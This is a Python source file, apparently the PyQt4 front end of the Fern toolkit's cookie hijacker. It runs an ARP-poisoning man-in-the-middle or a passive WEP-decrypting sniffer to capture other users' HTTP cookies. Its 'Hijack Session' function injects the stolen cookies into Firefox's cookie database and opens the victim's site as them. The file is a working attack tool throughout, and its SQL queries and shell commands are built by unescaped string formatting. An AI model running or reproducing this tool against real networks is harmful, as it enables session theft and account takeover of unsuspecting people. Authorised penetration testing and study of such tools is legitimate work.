import re
import os
import time
import sqlite3
import commands
import webbrowser

from PyQt4 import QtCore,QtGui

from MITM_Core import *
from gui.cookie_hijacker import *
from mozilla_cookie_core import *
from cookie_hijacker_core import *


class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)

        self.sniff_button_control = "START"
        self.interface_card_info = {}               # {eth0:ETHERNET, wlan0:WIFI}

        self.enable_control(False)
        self.Right_click_Menu()                     # Activate right click menu items
        self.is_mozilla_cookie_truncated = False    # Deletes all previous cookies in mozilla database

        self.monitor_interface = str()              # wlan0, mon0 etc

        self.red_light = QtGui.QPixmap("%s/resources/red_led.png"%(os.getcwd()))
        self.green_light = QtGui.QPixmap("%s/resources/green_led.png"%(os.getcwd()))

        self.refresh_interface()                    # Display list of wireless interface cards on startup
        self.clear_items()                          # Clear design items from cookie tree widget
        self.set_Window_Max()

        self.host_interface = str()                 # Hold the name of the current monitor host interface e.g wlan0

        self.cookie_db_jar = object                             # Sqlite3 Database object
        self.cookie_core = Cookie_Hijack_Core()                 # Cookie Capture and processing core
        self.mitm_core = Fern_MITM_Class.ARP_Poisoning()
        self.mozilla_cookie_engine = Mozilla_Cookie_Core()      # Mozilla fierfox cookie engine

        self.led_control = Led_Blick_Class()                    # Thread class for led blibking *

        self.connect(self.refresh_button,QtCore.SIGNAL("clicked()"),self.refresh_interface)
        self.connect(self.start_sniffing_button,QtCore.SIGNAL("clicked()"),self.start_Cookie_Attack)
        self.connect(self.ethernet_mode_radio,QtCore.SIGNAL("clicked()"),self.set_attack_option)
        self.connect(self.passive_mode_radio,QtCore.SIGNAL("clicked()"),self.set_attack_option)
        self.connect(self.combo_interface,QtCore.SIGNAL("currentIndexChanged(QString)"),self.reset)
        self.connect(self,QtCore.SIGNAL("triggered()"),QtCore.SLOT("close()"))

        self.connect_objects()



    def connect_objects(self):
        self.connect(self,QtCore.SIGNAL("creating cache"),self.creating_cache)
        self.connect(self,QtCore.SIGNAL("finished creating cache"),self.finished_creating_cache)
        self.connect(self.cookie_core,QtCore.SIGNAL("New Cookie Captured"),self.display_cookie_captured)    # Notification Signal for GUI instance"))
        self.connect(self.cookie_core,QtCore.SIGNAL("cookie buffer detected"),self.emit_led_buffer)         # Notification on new http packet
        self.connect(self,QtCore.SIGNAL("emit buffer red light"),self.emit_buffer_red_light)

        self.connect(self.led_control,QtCore.SIGNAL("on sniff red light"),self.off_sniff_red_light)         # Will bink the sniff led red for some seconds control from blink_light()
        self.connect(self.led_control,QtCore.SIGNAL("on sniff green light"),self.on_sniff_green_light)      # Will bink the sniff led green for some seconds control from blink_light()
        self.connect(self.led_control,QtCore.SIGNAL("Continue Sniffing"),self.start_Cookie_Attack_part)



    def reset(self):
        selected_card = str(self.combo_interface.currentText())
        if(selected_card == "Select Interface Card"):
            self.ethernet_mode_radio.setChecked(True)
            self.label.setText("Gateway IP Address / Router IP Address:")
            self.enable_control(False)
            return

        self.enable_control(True)
        if(self.interface_card_info.has_key(selected_card)):
            if(self.interface_card_info[selected_card] != "WIFI"):
                self.ethernet_mode_radio.setChecked(True)
                self.label.setText("Gateway IP Address / Router IP Address:")


    def enable_control(self,status):
        self.groupBox_2.setEnabled(status)
        self.passive_mode_radio.setEnabled(status)
        self.ethernet_mode_radio.setEnabled(status)
        self.start_sniffing_button.setEnabled(status)


    def set_attack_option(self,reset = False):
        selected_card = str(self.combo_interface.currentText())
        if(selected_card == "Select Interface Card"):
            QtGui.QMessageBox.warning(self,"Interface Option","Please select a valid interface card from the list of available interfaces")
            self.ethernet_mode_radio.setChecked(True)
            return

        if(self.ethernet_mode_radio.isChecked()):
            self.monitor_interface_label.setText("Ethernet Mode")
            self.label.setText("Gateway IP Address / Router IP Address:")
        else:
            if(self.interface_card_info[selected_card] == "ETHERNET"):
                QtGui.QMessageBox.warning(self,"Interface Option","The selected mode only works with WIFI enabled interface cards")
                self.ethernet_mode_radio.setChecked(True)
                return
            if(self.interface_card_info[selected_card] == "WIFI"):
                if(self.passive_mode_radio.isChecked()):
                    self.monitor_interface_label.setText("Monitor Mode")
                    self.label.setText("WEP Decryption Key:")
                else:
                    self.monitor_interface_label.setText("Ethernet Mode")
                    self.label.setText("Gateway IP Address / Router IP Address:")


    def set_Window_Max(self):
        try:
            self.setWindowFlags(
            QtCore.Qt.WindowMinMaxButtonsHint |
            QtCore.Qt.WindowCloseButtonHint |
            QtCore.Qt.Dialog)
        except:pass


    def display_error(self,message):
        self.cookies_captured_label.setText(
            "<font color=red><b>" + message + "</b></font>")


    def firefox_is_installed(self):
        if(commands.getstatusoutput("which firefox")[0]):
            return(False)
        return(True)


    def refresh_interface(self):
        interface_cards = []
        self.interface_card_info = {}
        self.combo_interface.clear()
        self.host_interface = str()
        interfaces = commands.getoutput("iwconfig").splitlines()

        for card in os.listdir("/sys/class/net"):
            if(card.startswith("mon")):
                commands.getoutput("airmon-ng stop " + card)

        sys_interface_cards = os.listdir("/sys/class/net")

        for card in sys_interface_cards:
            if(card.startswith("mon")):
                continue
            if(card == "lo"):               # Loopback interface
                continue

            for card_info in interfaces:
                if((card in card_info) and ("802.11" in card_info)):
                    interface_cards.append(card)
                    self.interface_card_info[card] = "WIFI"

            if(card not in interface_cards):
                interface_cards.append(card)
                self.interface_card_info[card] = "ETHERNET"

        if(len(interface_cards) >= 1):
            interface_cards.insert(0,"Select Interface Card")
            interface_cards.sort()
        else:
            self.display_error("No Usable interface detected")
        self.combo_interface.addItems(interface_cards)

    ###
    def on_sniff_green_light(self):
        self.sniffing_status_led.setPixmap(self.green_light)


    def off_sniff_red_light(self):
        self.sniffing_status_led.setPixmap(self.red_light)

    ##

    def set_monitor_mode(self):
        selected_interface = str(self.combo_interface.currentText())
        self.cookies_captured_label.clear()
        if((selected_interface == "Select Interface Card") or (selected_interface == str())):
            self.clear_items()
            return
        else:
            monitor_status = commands.getoutput("iwconfig " + selected_interface)
            if("Monitor" in monitor_status):
                self.monitor_interface = selected_interface
                self.monitor_interface_led.setPixmap(self.green_light)
                self.host_interface = selected_interface

            elif(selected_interface == self.host_interface):
                self.monitor_interface_led.setPixmap(self.green_light)
                return

            else:
                display = '''%s is currently not on monitor mode, should a monitor interface be created using the selected interface'''%(selected_interface)
                answer = QtGui.QMessageBox.question(self,"Enable Monitor Mode",display,QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
                if(answer == QtGui.QMessageBox.Yes):
                    monitor_output = commands.getstatusoutput("airmon-ng start " + selected_interface)

                    if(monitor_output[0] == 0):
                        monitor_interface = re.findall("mon\d+",monitor_output[1])

                        if(monitor_interface):
                            self.monitor_interface = monitor_interface[0]
                            self.monitor_interface_led.setPixmap(self.green_light)
                            self.host_interface = selected_interface

                        elif("monitor mode enabled" in monitor_output[1]):
                            self.monitor_interface = selected_interface
                            self.monitor_interface_led.setPixmap(self.green_light)
                            self.host_interface = selected_interface
                        else:
                            self.display_error(monitor_output[1])
                    else:
                        self.display_error(monitor_output[1])
                else:
                    self.clear_items()


    def Right_click_Menu(self):

        self.treeWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.treeWidget.customContextMenuRequested.connect(self._Right_Click_Options)


    def Save_Cookies(self):
        selected_path = str(QtGui.QFileDialog.getSaveFileName(self,"Save Cookies","cookies.txt"))
        if(selected_path):
            cookie_open_file = open(selected_path,"w")

            database_path = os.getcwd() + "/key-database/Cookie.db"
            self.cookie_db_jar = sqlite3.connect(database_path)
            self.cookie_db_cursor = self.cookie_db_jar.cursor()

            self.cookie_db_cursor.execute("select distinct source from cookie_cache")
            source_addresses = self.cookie_db_cursor.fetchall()

            for source in source_addresses:              # e.g [0,("192.168.0.1",)]
                ip_address = str(source[0])

                cookie_open_file.write("\n\n")
                cookie_open_file.write(ip_address + "\n")
                cookie_open_file.write("-" * 20)
                cookie_open_file.write("\n")

                self.cookie_db_cursor.execute("select distinct Web_Address from cookie_cache where source = '" + ip_address + "'")
                web_addresses = self.cookie_db_cursor.fetchall()

                for web_address in web_addresses:
                    web_addr = str(web_address[0])

                    cookie_open_file.write("\n\n" + web_addr.strip() + "\n")
                    cookie_open_file.write("-" * (len(web_addr) + 5))
                    cookie_open_file.write("\n")

                    self.cookie_db_cursor.execute("select distinct Name,Value from cookie_cache where source = '%s' and Web_Address = '%s'"%(ip_address,web_addr))
                    cookies_values = self.cookie_db_cursor.fetchall()

                    for cookies in cookies_values:
                        cookie = cookies[0]
                        value = cookies[1]

                        cookie_open_file.write("\n%s:     %s" % (str(cookie),str(value)))

            cookie_open_file.close()
            QtGui.QMessageBox.information(self,"Save Cookies","Successfully saved all captured cookies to:  " + selected_path)



    def Clear_All(self):
        answer = QtGui.QMessageBox.question(self,"Clear Captured Cookies","Are you sure you want to clear all captured cookies?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
        if(answer == QtGui.QMessageBox.Yes):
            self.cookie_db_cursor.execute("delete from cookie_cache")
            self.cookie_db_jar.commit()
            self.cookie_core.captured_cookie_count = 0
            self.cookies_captured_label.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")
            self.treeWidget.clear()


    def Delete_Cookie(self):
        self.treeWidget.currentItem().removeChild(self.treeWidget.currentItem())


    def open_web_address(self,address):
        shell = "firefox %s"
        commands.getoutput(shell % address)


    def Hijack_Session(self):
        commands.getoutput("killall firefox-bin")
        selected_cookie = str(self.treeWidget.currentItem().text(0))
        sql_code_a = "select Referer from cookie_cache where Web_Address = '%s'"
        sql_code_b = "select Host,Name,Value,Dot_Host,Path,IsSecured,IsHttpOnly from cookie_cache where Web_Address = '%s'"

        self.cookie_db_cursor.execute("select Host from cookie_cache where Web_Address = '%s'" % (selected_cookie))
        result = self.cookie_db_cursor.fetchone()
        if(result):
            self.mozilla_cookie_engine.execute_query("delete from moz_cookies where baseDomain = '%s'" % (result[0]))

        self.cookie_db_cursor.execute(sql_code_a % (selected_cookie))
        web_address = self.cookie_db_cursor.fetchone()[0]

        self.cookie_db_cursor.execute(sql_code_b % (selected_cookie))
        return_items = self.cookie_db_cursor.fetchall()

        for entries in return_items:
            self.mozilla_cookie_engine.insert_Cookie_Values(
            str(entries[0]),str(entries[1]),str(entries[2]),
            str(entries[3]),str(entries[4]),str(entries[5]),
            str(entries[6]))

        thread.start_new_thread(self.open_web_address,(web_address,))




    def _Right_Click_Options(self,pos):
        menu = QtGui.QMenu()
        try:
            item_type = str(self.treeWidget.currentItem().text(0))
        except AttributeError:
            return

        hijack_cookie = menu.addAction("Hijack Session")

        if((item_type.count(".") == 3  and item_type[0:3].isdigit()) or item_type.count(":") >= 1):
            hijack_cookie.setEnabled(False)
        else:
            if not self.firefox_is_installed():
                hijack_cookie.setEnabled(False)
            else:
                hijack_cookie.setEnabled(True)

        save_cookie = menu.addAction("Save Cookies")
        clear_all = menu.addAction("Clear All")
        delete_cookie = menu.addAction("Delete")

        selected_action = menu.exec_(self.treeWidget.mapToGlobal(pos))
        if(selected_action == hijack_cookie):
            self.Hijack_Session()
        if(selected_action == save_cookie):
            self.Save_Cookies()
        if(selected_action == clear_all):
            self.Clear_All()
        if(selected_action == delete_cookie):
            self.Delete_Cookie()



    # Blinks the cookie buffer light on http packet detection
    def emit_led_buffer(self):
        self.cookie_detection_led.setPixmap(self.green_light)
        thread.start_new_thread(self.delay_thread,())

    def emit_buffer_red_light(self):
        self.cookie_detection_led.setPixmap(self.red_light)

    def delay_thread(self):
        time.sleep(0.2)
        self.emit(QtCore.SIGNAL("emit buffer red light"))



    # Displays cookies on GUI treeWidget
    def display_cookie_captured(self):
        self.treeWidget.clear()

        database_path = os.getcwd() + "/key-database/Cookie.db"
        self.cookie_db_jar = sqlite3.connect(database_path)
        self.cookie_db_cursor = self.cookie_db_jar.cursor()

        self.cookie_db_cursor.execute("select distinct source from cookie_cache")
        source_addresses = self.cookie_db_cursor.fetchall()

        for count_a,source in enumerate(source_addresses):              # e.g [0,("192.168.0.1",)]
            ip_address = str(source[0])

            item_0 = QtGui.QTreeWidgetItem(self.treeWidget)

            self.treeWidget.topLevelItem(count_a).setText(0,ip_address)
            self.cookie_db_cursor.execute("select distinct Web_Address from cookie_cache where source = '" + ip_address + "'")
            web_addresses = self.cookie_db_cursor.fetchall()

            for count_b,web_address in enumerate(web_addresses):

                web_addr = str(web_address[0])

                item_1 = QtGui.QTreeWidgetItem(item_0)
                icon = QtGui.QIcon()
                icon.addPixmap(self.green_light)
                item_1.setIcon(0, icon)

                self.treeWidget.topLevelItem(count_a).child(count_b).setText(0,web_addr)
                self.cookie_db_cursor.execute("select distinct Name,Value from cookie_cache where source = '%s' and Web_Address = '%s'"%(ip_address,web_addr))
                cookies_values = self.cookie_db_cursor.fetchall()

                for count_c,cookies in enumerate(cookies_values):
                    cookie = cookies[0]
                    value = cookies[1]

                    item_2 = QtGui.QTreeWidgetItem(item_1)
                    self.treeWidget.topLevelItem(count_a).child(count_b).child(count_c).setText(0,"%s:  %s" % (str(cookie),str(value)))

        self.treeWidget.collapseAll()
        self.cookies_captured_label.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")

    def prepare_Mozilla_Database(self):
        sql_code_a = "select value from cache_settings where setting = 'cookie_path'"
        sql_code_b = "select value from cache_settings where setting = 'library_path'"
        sql_code_c = "insert into cache_settings values ('%s','%s')"
        if(self.firefox_is_installed()):
            if not self.mozilla_cookie_engine.cookie_database:

                database_path = os.getcwd() + "/key-database/Cookie.db"
                cookie_db_jar = sqlite3.connect(database_path)
                cookie_db_cursor = cookie_db_jar.cursor()

                cookie_db_cursor.execute(sql_code_a)
                result = cookie_db_cursor.fetchone()
                if(result):
                    self.mozilla_cookie_engine.cookie_database = result[0]
                else:
                    self.emit(QtCore.SIGNAL("creating cache"))
                    path = self.mozilla_cookie_engine.get_Cookie_Path("cookies.sqlite")
                    if not path:
                        raise Exception("cookies.sqlite3 firefox database has not been created on this system, Please run firefox to create")
                    cookie_db_cursor.execute(sql_code_c % ("cookie_path",path))
                    cookie_db_jar.commit()

                cookie_db_cursor.execute(sql_code_b)
                result = cookie_db_cursor.fetchone()
                if(result):
                    self.mozilla_cookie_engine.mozilla_install_path = result[0]
                else:
                    self.emit(QtCore.SIGNAL("creating cache"))
                    path = self.mozilla_cookie_engine.find_mozilla_lib_path()
                    cookie_db_cursor.execute(sql_code_c % ("library_path",path))
                    cookie_db_jar.commit()

                cookie_db_jar.close()

            self.emit(QtCore.SIGNAL("finished creating cache"))
            self.mozilla_cookie_engine.execute_query("delete from moz_cookies")


    def creating_cache(self):
        self.start_sniffing_button.setEnabled(False)
        self.cookies_captured_label.setText("<font color=green>Please wait caching objects...</font>")


    def finished_creating_cache(self):
        self.start_sniffing_button.setEnabled(True)
        self.cookies_captured_label.clear()
        self.start_Attack()                                                                             # ATTACK CONTINUES HERE <---



    # Attack starts here on button click()
    def start_Cookie_Attack(self):
        if(self.sniff_button_control == "STOP"):
            self.stop_Cookie_Attack()
            return

        self.sniff_button_control = "STOP"
        selected_interface = str(self.combo_interface.currentText())
        self.cookies_captured_label.clear()
        ip_wep_edit = str(self.wep_key_edit.text())

        if(self.passive_mode_radio.isChecked()):
            self.set_monitor_mode()
            self.cookie_core.decryption_key = ip_wep_edit                # Pipes key (WEP) into cookie process API for processing encrypted frames
            self.mitm_activated_label.setEnabled(False)
            self.mitm_activated_label.setText("Internal MITM Engine Activated")

        if(self.ethernet_mode_radio.isChecked()):
            if(not re.match("(\d+.){3}\d+",ip_wep_edit)):
                QtGui.QMessageBox.warning(self,"Invalid IP Address","Please insert a valid IPv4 Address of the Default Gateway")
                self.wep_key_edit.setFocus()
                return

            self.monitor_interface_led.setPixmap(self.green_light)
            self.mitm_core.interface_card = selected_interface
            self.mitm_core.gateway_IP_address = ip_wep_edit             # Gateway Address
            self.mitm_core.set_Attack_Option("ARP POISON + ROUTE")
            self.mitm_core.start()
            self.mitm_activated_label.setEnabled(True)
            self.mitm_activated_label.setText("<font color = green><b>Internal MITM Engine Activated</b></font>")

            self.monitor_interface = selected_interface

        try:
            database_path = os.getcwd() + "/key-database/Cookie.db"
            self.cookie_core.cookie_db_jar = sqlite3.connect(database_path)
            self.cookie_core.cookie_db_cursor = self.cookie_core.cookie_db_jar.cursor()
            self.cookie_core.create_cookie_cache()                      # Create Cookie Cache
            self.cookie_core.truncate_database()                        # Delete all old items from database
        except Exception,message:
            self.display_error("Failed to create cookie database: " + str(message))
            return

        thread.start_new_thread(self.prepare_Mozilla_Database,())       # Trucates and prepares database




    def start_Attack(self):
        if not self.firefox_is_installed():
            QtGui.QMessageBox.warning(self,"Mozilla Firefox Detection",
            "Mozilla firefox is currently not installed on this computer, you need firefox to browse hijacked sessions, Process will capture cookies for manual analysis")

        self.treeWidget.clear()
        self.connect_objects()
        self.wep_key_edit.setEnabled(False)                             # Lock WEP/WPA LineEdit

        self.cookie_core.control = True                                 # Start Core Thread processes
        self.cookie_core.monitor_interface = self.monitor_interface     # Holds the monitor interface e.g mon0,mon1

        self.led_control.start()                                        # Blinks Sniff Led for some number of seconds
        self.start_sniffing_button.setEnabled(False)



    def start_Cookie_Attack_part(self):
        try:
            self.cookie_core.start()
            self.sniffing_status_led.setPixmap(self.green_light)
            self.start_sniffing_button.setEnabled(True)
            self.start_sniffing_button.setText("Stop Sniffing")
            self.ethernet_mode_radio.setEnabled(False)
            self.passive_mode_radio.setEnabled(False)

        except Exception,message:
            self.display_error(str(message))
            self.sniffing_status_led.setPixmap(self.red_light)
            self.cookie_detection_led.setPixmap(self.red_light)
            self.ethernet_mode_radio.setEnabled(True)
            self.passive_mode_radio.setEnabled(True)



    def stop_Cookie_Attack(self):
        self.sniff_button_control = "START"
        if(self.ethernet_mode_radio.isChecked()):
            self.mitm_activated_label.setEnabled(False)
            self.mitm_activated_label.setText("Internal MITM Engine Activated")
            self.mitm_core.control = False

            self.mitm_core._Thread__stop()
            self.mitm_core = Fern_MITM_Class.ARP_Poisoning()

        self.cookie_core.control = False

        if(self.cookie_core.isRunning()):
            self.cookie_core.terminate()                                    # Kill QtCore.QThread

        if(self.led_control.isRunning()):
            self.led_control.terminate()

        self.wep_key_edit.setEnabled(True)                              # Release WEP/WPA Decryption LineEdit
        self.start_sniffing_button.setText("Start Sniffing")
        self.ethernet_mode_radio.setEnabled(True)
        self.passive_mode_radio.setEnabled(True)

        self.cookie_core = Cookie_Hijack_Core()
        self.sniffing_status_led.setPixmap(self.red_light)



    def clear_items(self):
        self.treeWidget.clear()
        self.cookies_captured_label.clear()
        self.cookie_detection_label.setEnabled(True)
        self.sniffing_status_label.setEnabled(True)
        self.monitor_interface_label.setEnabled(True)
        self.cookie_detection_led.setPixmap(self.red_light)
        self.sniffing_status_led.setPixmap(self.red_light)
        self.cookies_captured_label.clear()
        self.monitor_interface_led.setPixmap(self.red_light)


    def closeEvent(self,event):
        typedef = type(self.cookie_db_jar).__name__
        if(typedef == "Connection"):
            self.cookie_db_jar.close()                          # Close cookie database connection
        self.mitm_core._Thread__stop()
        self.cookie_core.terminate()                            # Kill QtCore.QThread
        self.led_control.terminate()



class Led_Blick_Class(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)

    def run(self):
        for count in range(3):
            self.emit(QtCore.SIGNAL("on sniff green light"))
            time.sleep(1)
            self.emit(QtCore.SIGNAL("on sniff red light"))
            time.sleep(1)
            self.emit(QtCore.SIGNAL("on sniff green light"))

        self.emit(QtCore.SIGNAL("Continue Sniffing"))
        self.exit(0)

